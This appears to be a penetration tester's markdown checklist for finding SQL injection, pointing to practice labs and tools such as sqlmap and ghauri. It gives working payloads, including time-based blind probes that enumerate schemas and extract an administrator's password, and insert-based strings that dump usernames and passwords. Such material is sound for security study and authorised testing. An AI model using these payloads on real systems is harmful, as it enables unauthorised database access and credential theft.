# SQL Injection

## Checks

- [ ] Look for any endpoint/functionality that seems like it is touching the DB
	- Try injecting a single or double quote and look for changes in response
	- Try adding comments on login forms to bypass authentication
	- Try to enumerate the database type and version
- [ ] Check if you can trigger an error
	- Visible errors
	- Conditional errors (e.g., divide by zero)
- [ ] Check if you can trigger a conditional response
- [ ] Try to trigger a time delay


	 ```text title="Basic sleep"
	 test@test.com' and 1=sleep(3);-- -
	 ```
	 
	 ```text title="Find schema_name"
	 ' or 1=(SELECT SLEEP(3) FROM information_schema.SCHEMATA WHERE SCHEMA_NAME like 'i%' LIMIT 1 );--
	 ```
	 
	```text title="Find tables"
	' or 1=(SELECT SLEEP(3) FROM information_schema.TABLES WHERE TABLE_SCHEMA='sqli_four' and TABLE_NAME like 'u%' LIMIT 1 );--
	```
	
	
	```text title="Find columns"
	' and (SELECT sleep(3) from information_schema.COLUMNS where TABLE_SCHEMA = 'sqli_four' and TABLE_NAME = 'users' and COLUMN_NAME like 'u%' LIMIT 1);--+-
	```
	
	
	```text title="Find administrator's password"
	' AND 1=(SELECT sleep(3) FROM users WHERE username = 'administrator' AND password like 'a%' LIMIT 1);-- -
	```

- [ ] Look for any input fields that may be inserting rows into the database and check those for injection as well. 

	!!! warning
		Be careful with testing this. Inserting rows into the db without consideration has the potential to break something in the application.

	- Examples

	```text title="Get distinct table schema"
	title',(SELECT GROUP_CONCAT(DISTINCT TABLE_SCHEMA) FROM information_schema.tables));--
	```
	
	
	```text title="Get table names from the sqli_five database"
	title',(SELECT GROUP_CONCAT(TABLE_NAME) FROM information_schema.tables where TABLE_SCHEMA='sqli_five'));--
	```
	
	
	```text title="Get username and password"
	title',(SELECT GROUP_CONCAT(concat(id,':',username,':',password),'<br>') FROM sqli_five.users));--
	```


- Blind insert examples

	```text title="Basic blind sleep"
	test',sleep(5),'');-- -
	```
	
	
	```text title="Blind sleep to get version"
	',( select sleep(5) where version() like '8%' ) ,'');--
	```
	
	
	```text title="Get specific value"
	',( select sleep(5) from flag where flag like 'a%' ),'');--
	```

## Labs

- [ ] All PortSwigger SQLi Labs
- [ ] Audi-l/sql-labs
    [GitHub - Audi-1/sqli-labs: SQLI labs to test error based, Blind boolean based, Time based.](https://github.com/Audi-1/sqli-labs)
- [ ] SpiderLabs/MCIR
    [GitHub - SpiderLabs/MCIR: The Magical Code Injection Rainbow! MCIR is a framework for building configurable vulnerability testbeds. MCIR is also a collection of configurable vulnerability testbeds.](https://github.com/SpiderLabs/MCIR)

!!! tip "Note that these last two are not currently maintained"
## Tools

- [ ] sqlmap
- [ ] ghauri
    [GitHub - r0oth3x49/ghauri: An advanced cross-platform tool that automates the process of detecting and exploiting SQL injection security flaws](https://github.com/r0oth3x49/ghauri)

	!!! tip "Custom headers are still by far the most common place to still find SQLi"

- [ ] hbsqli
